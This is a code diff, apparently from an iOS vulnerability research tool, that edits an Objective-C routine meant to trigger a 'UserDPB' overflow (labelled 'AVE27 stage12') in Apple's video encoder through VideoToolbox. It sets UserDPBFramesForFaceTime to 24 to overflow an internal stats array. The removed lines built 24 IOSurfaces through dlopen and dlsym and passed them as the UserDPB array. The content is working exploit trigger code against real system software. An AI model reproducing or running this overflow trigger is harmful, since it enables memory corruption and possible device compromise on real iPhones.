@@ -348,9 +348,8 @@
         [report appendString:@"  dlopen IOSurface failed\n"];
     }
 
-    // === UserDPB IOSurface overflow (AVE27 stage12) ===
-    [report appendString:@"\n--- UserDPB IOSurface overflow ---\n"];
-    [report appendString:@"Target: saMBStats[m] overflow via DPB=24 surfaces\n"];
+    // === UserDPB overflow trigger (AVE27 stage12) ===
+    [report appendString:@"\n--- UserDPB overflow trigger ---\n"];
 
     VTCompressionSessionRef sDPB = NULL;
     OSStatus stDPB = VTCompressionSessionCreate(
@@ -378,28 +377,6 @@
         OSStatus stFrames = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"), nf);
         CFRelease(nf);
         [report appendFormat:@"  UserDPBFramesForFaceTime=24 -> %d\n", (int)stFrames];
-
-        // Create 24 IOSurfaces via dlopen
-        NSMutableArray *surfaces = [NSMutableArray array];
-        void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
-        if (isLib) {
-            typedef void *(*ISCreateFn)(CFDictionaryRef);
-            ISCreateFn isCreate = (ISCreateFn)dlsym(isLib, "IOSurfaceCreate");
-            if (isCreate) {
-                for (int i = 0; i < 24; i++) {
-                    NSDictionary *sp = @{ @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerElement": @4 };
-                    void *surf = isCreate((__bridge CFDictionaryRef)sp);
-                    if (surf) [surfaces addObject:(__bridge id)surf];
-                }
-            }
-        }
-        [report appendFormat:@"  surfaces created: %lu\n", (unsigned long)surfaces.count];
-
-        // Set UserDPB with IOSurface array
-        if (surfaces.count > 0) {
-            OSStatus stDPBSet = VTSessionSetProperty(sDPB, CFSTR("UserDPB"), (__bridge CFArrayRef)surfaces);
-            [report appendFormat:@"  UserDPB (array) -> %d\n", (int)stDPBSet];
-        }
 
         // DPBRequirements
         NSMutableArray *dpbReq = [NSMutableArray array];
